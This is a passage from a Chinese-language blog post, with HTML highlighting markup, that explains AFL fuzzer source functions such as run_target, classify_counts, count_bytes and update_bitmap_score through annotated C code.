class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h3><p>检查有没有新路径或者某个路径的执行次数有所不同：0 表示无成果；1 表示 hit count 变动；2 表示发现了新的边</p><h3 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h3><p>通过子进程的方式执行目标应用并返回执行结果</p><ul><li>清空 trace_bits，设置内存屏障，防止编译器优化</li><li>检查是否是 dumb 模式 或开启 forkserver<ul><li>dumb 模式或无 forkserver<ul><li>创建子进程并获取进程号，失败则报错退出</li><li>如果存在内存限制则设置地址空间限制</li><li>禁止生成 core dump 文件</li><li>新建会话，使得子进程完全独立</li><li>重定向标准输入输出后关闭不需要的文件描述符，不存在输出文件则重定向输入到 &#x2F;dev&#x2F;null，存在就重定向到输出文件</li><li>设置 AddressSanitizer 和 MemorySanitizer 的默认环境变量</li><li>执行目标程序，如果 execv 执行失败，使用特定的位图值 0xfee1dead 通知父进程</li></ul></li><li>非 dumb 模式且有 forkserver<ul><li>要求 fork server 启动 child</li><li>从 fork server 读 child pid</li></ul></li></ul></li><li>设置超时时间，启动真实时间定时器</li><li>检查是否是 dumb 模式 或开启 forkserver<ul><li>dumb 模式或无 forkserver<ul><li>通过waitpid等待子进程结束</li></ul></li><li>非 dumb 模式且有 forkserver<ul><li>通过读取状态管道来获取子进程的退出状态</li></ul></li></ul></li><li>检查子进程是否已停止，如果是，清空child_pid</li><li>清空定时器，更新总执行次数统计，设置内存屏障</li><li>读取 trace_bits 的前四个字节，用于后续逻辑判断，和错误信号相关</li><li><a href="##classify_counts">classify_counts</a> 对 trace_bits 中的计数进行分类</li><li>更新超时记录</li><li>判断并返回运行情况<ul><li>如果子进程因为信号退出且不是即将停止，获取退出信号，如果因超时被杀，则返回超时故障 FAULT_TMOUT，否则返回崩溃故障 FAULT_CRASH</li><li>如果 execv 调用失败（trace_bits 的前四个字节为 EXEC_FAIL_SIG），返回错误故障 FAULT_ERROR</li><li>如果一切正常，则返回无错误 FAULT_NONE</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">run_target</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> u32 timeout<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">itimerval</span> it<span class="token punctuation">;</span><span class="token comment">// 定时器结构，用于设置超时</span>  <span class="token keyword">static</span> u32 prev_timed_out <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> status <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 子进程的退出状态</span>  u32 tb4<span class="token punctuation">;</span>  child_timed_out <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空 trace_bits</span>  <span class="token function">MEM_BARRIER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 内存屏障，防止编译器优化</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> no_forkserver<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//dumb 模式或无 forkserver</span>    child_pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建子进程并获取进程号</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>child_pid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">struct</span> <span class="token class-name">rlimit</span> r<span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在内存限制</span>        r<span class="token punctuation">.</span>rlim_max <span class="token operator">=</span> r<span class="token punctuation">.</span>rlim_cur <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">rlim_t</span><span class="token punctuation">)</span>mem_limit<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">RLIMIT_AS</span></span>        <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_AS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置地址空间限制</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>        <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_DATA<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Ignore errors */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^RLIMIT_AS */</span></span>      <span class="token punctuation">&#125;</span>      r<span class="token punctuation">.</span>rlim_max <span class="token operator">=</span> r<span class="token punctuation">.</span>rlim_cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_CORE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 禁止生成 core dump 文件</span>      <span class="token function">setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 新建会话，使得子进程完全独立</span>      <span class="token comment">//重定向标准输入输出后关闭不需要的文件描述符</span>      <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不存在输出文件则重定向输入到 /dev/null</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">dup2</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//存在就重定向到输出文件</span>        <span class="token function">close</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">close</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>out_dir_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>dev_urandom_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span><span class="token function">fileno</span><span class="token punctuation">(</span>plot_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//设置 AddressSanitizer 和 MemorySanitizer 的默认环境变量</span>      <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"ASAN_OPTIONS"</span><span class="token punctuation">,</span> <span class="token string">"abort_on_error=1:detect_leaks=0:symbolize=0:allocator_may_return_null=1"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"MSAN_OPTIONS"</span><span class="token punctuation">,</span> <span class="token string">"exit_code="</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>MSAN_ERROR<span class="token punctuation">)</span> <span class="token string">":symbolize=0:msan_track_origins=0"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">execv</span><span class="token punctuation">(</span>target_path<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 执行目标程序</span>      <span class="token operator">*</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits <span class="token operator">=</span> EXEC_FAIL_SIG<span class="token punctuation">;</span><span class="token comment">//如果 execv 执行失败，使用特定的位图值 0xfee1dead 通知父进程</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//非dumb 模式且启用 forkserver，直接发送控制命令并获取结果</span>    s32 res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fsrv_ctl_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_timed_out<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 要求 fork server 启动 child</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">RPFATAL</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">"Unable to request new process from fork server (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>child_pid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 从 fork server 读 child pid</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">RPFATAL</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">"Unable to request new process from fork server (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Fork server is misbehaving (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token punctuation">(</span>timeout <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token punctuation">(</span>timeout <span class="token operator">%</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>it<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置超时时间，启动真实时间定时器</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> no_forkserver<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//dumb 模式或无 forkserver</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"waitpid() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过waitpid等待子进程结束</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    s32 res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//有 fork_server 通过读取状态管道来获取子进程的退出状态</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">RPFATAL</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">"Unable to communicate with fork server (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> child_pid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 检查子进程是否已停止，如果是，清空child_pid</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>it<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空定时器</span>  total_execs<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 更新总执行次数统计</span>  <span class="token function">MEM_BARRIER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tb4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">;</span><span class="token comment">// 读取trace_bits的前四个字节，用于后续逻辑判断</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__x86_64__</span></span>  <span class="token function">classify_counts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u64<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 对trace_bits中的计数进行分类</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  <span class="token function">classify_counts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^__x86_64__ */</span></span>  prev_timed_out <span class="token operator">=</span> child_timed_out<span class="token punctuation">;</span><span class="token comment">//更新超时记录</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>stop_soon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果子进程因为信号退出且不是即将停止</span>    kill_signal <span class="token operator">=</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取退出信号</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child_timed_out <span class="token operator">&amp;&amp;</span> kill_signal <span class="token operator">==</span> SIGKILL<span class="token punctuation">)</span> <span class="token keyword">return</span> FAULT_TMOUT<span class="token punctuation">;</span><span class="token comment">// 如果因超时被杀，则返回超时故障</span>    <span class="token keyword">return</span> FAULT_CRASH<span class="token punctuation">;</span><span class="token comment">// 否则返回崩溃故障</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>uses_asan <span class="token operator">&amp;&amp;</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">==</span> MSAN_ERROR<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    kill_signal <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> FAULT_CRASH<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dumb_mode <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> no_forkserver<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> tb4 <span class="token operator">==</span> EXEC_FAIL_SIG<span class="token punctuation">)</span><span class="token comment">// 如果execv调用失败，返回错误故障</span>    <span class="token keyword">return</span> FAULT_ERROR<span class="token punctuation">;</span>  <span class="token keyword">return</span> FAULT_NONE<span class="token punctuation">;</span><span class="token comment">// 如果一切正常，则返回无错误</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="classify-counts"><a href="#classify-counts" class="headerlink" title="classify_counts"></a>classify_counts</h3><p>对内存中的计数值进行分类处理以优化位图的存储，一次处理两字节，还会对连续 8 字节做循环展开，进一步提升效率</p><p>循环每次处理 64 位，每 64 位再分成 4 部分分别处理，count_class_lookup16 通过 <a href="##init_count_class16">init_count_class16 </a>初始化</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">classify_counts</span><span class="token punctuation">(</span>u64<span class="token operator">*</span> mem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i <span class="token operator">=</span> MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">// 计算需要处理的64位块的数量，MAP_SIZE 通常是位图的总大小</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 对每个64位块执行循环</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果当前64位块不为零</span>      u16<span class="token operator">*</span> mem16 <span class="token operator">=</span> <span class="token punctuation">(</span>u16<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">;</span><span class="token comment">// 将64位块视为16位的四个部分</span>      <span class="token comment">// 对每个16位的部分应用查找表转换，优化存储和访问效率</span>      mem16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> count_class_lookup16<span class="token punctuation">[</span>mem16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> count_class_lookup16<span class="token punctuation">[</span>mem16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> count_class_lookup16<span class="token punctuation">[</span>mem16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      mem16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> count_class_lookup16<span class="token punctuation">[</span>mem16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    mem<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 移动到下一个64位块</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h3><p>FF(0) &#x3D; 0x000000ffFF(1) &#x3D; 0x0000ff00FF(2) &#x3D; 0x00ff0000FF(3) &#x3D; 0xff000000</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FF</span><span class="token expression"><span class="token punctuation">(</span>_b<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>循环读取 mem 里的值，每次读取 4 个字节到 u32 变量 v 中<ul><li>v 是 0，则代表这四个字节都是 0，则继续</li><li>v 不是 0，则依次计算 <code>v &amp; FF(0),v &amp; FF(1),v &amp; FF(2),v&amp;FF(3)</code> 的结果，如果不为 0，则计数器 ret 加一</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u32 <span class="token function">count_bytes</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> mem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32<span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">;</span>  u32  i   <span class="token operator">=</span> <span class="token punctuation">(</span>MAP_SIZE <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  u32  ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u32 v <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>v<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">&amp;</span> <span class="token function">FF</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ret<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">&amp;</span> <span class="token function">FF</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ret<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">&amp;</span> <span class="token function">FF</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ret<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">&amp;</span> <span class="token function">FF</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ret<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h3><p>遇到一个新路径时，调用此函数来判断这个路径是否比已有的路径更“有利”，目的是保持一个最小的路径集合，这些路径触发了到目前为止在位图中看到的所有位，并且专注于对它们进行模糊测试，而不是其他路径</p><ul><li>计算当前有利因子，计算方式为执行时间 * 长度，越小越好</li><li>遍历 trace_bits，不为 0 说明是已经被覆盖到的路径<ul><li>如果该位已经有设置过的最优解，比较当前解与最优解，如果当前更大则跳过当前项</li><li>当前解更优，减少先前最优解的引用次数，减少到 0 则释放内存清空指针</li><li>将当前项设置为最有解，并增加引用次数</li><li>如果还没有最小化的位图则分配内存后调用 <a href="##minimize_bits">minimize_bits</a> 最小化位图</li><li>标记 score_changed 得分已改变</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">update_bitmap_score</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i<span class="token punctuation">;</span>  u64 fav_factor <span class="token operator">=</span> q<span class="token operator">-></span>exec_us <span class="token operator">*</span> q<span class="token operator">-></span>len<span class="token punctuation">;</span><span class="token comment">//计算当前测试用例的“有利因子”（执行时间乘以长度，越小越好）</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAP_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//遍历 trace_bits</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>trace_bits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//不为 0 说明是已经被覆盖到的路径</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>top_rated<span class="token 